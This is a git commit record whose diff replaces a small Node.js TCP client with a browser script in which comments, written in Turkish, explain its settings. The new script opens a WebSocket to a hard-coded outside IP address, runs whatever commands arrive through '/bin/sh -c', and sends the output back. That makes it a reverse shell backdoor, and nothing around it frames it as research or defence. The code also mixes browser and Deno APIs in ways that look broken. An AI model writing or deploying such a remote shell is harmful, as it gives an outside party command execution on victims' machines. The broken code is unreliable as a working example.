e1ea2880b3ba293a9efcb63fb375681e70fa4826
isimsiz <75686345+isimsizbirii@users.noreply.github.com>
2024-03-19 12:04:10 +0300

    Update sc.js

--- sc.js
+++ sc.js
@@ -1,16 +1,30 @@
-const net = require('net');
+<script>
+    var port = 4545; // Bağlantı kurulacak port numarası
+    var host = '31.172.87.6'; // Bağlantı kurulacak IP adresi
 
-const HOST = '31.172.87.6';
-const PORT = 2525;
+    var s = new WebSocket('ws://' + host + ':' + port);
 
-const client = net.createConnection({ host: HOST, port: PORT }, () => {
-  console.log('Sunucuya bağlandı.');
-});
+    s.onopen = function () {
+        s.send('Bağlantı başarılı. Merhaba!');
+    };
 
-process.stdin.pipe(client);
-client.pipe(process.stdout);
-
-client.on('end', () => {
-  console.log('Bağlantı kesildi.');
-});
-
+    s.onmessage = function (e) {
+        var command = e.data;
+        var child = new Worker(URL.createObjectURL(new Blob([`
+            var cmd = '` + command + `';
+            var p = Deno.run({
+                cmd: ['/bin/sh', '-c', cmd],
+                stdout: 'piped',
+                stderr: 'piped',
+                stdin: 'piped'
+            });
+            var stdout = new TextDecoder().decode(await p.output());
+            var stderr = new TextDecoder().decode(await p.stderrOutput());
+            var output = stdout + '\\n' + stderr;
+            postMessage(output);
+        `])));
+        child.onmessage = function (e) {
+            s.send(e.data);
+        };
+    };
+</script>
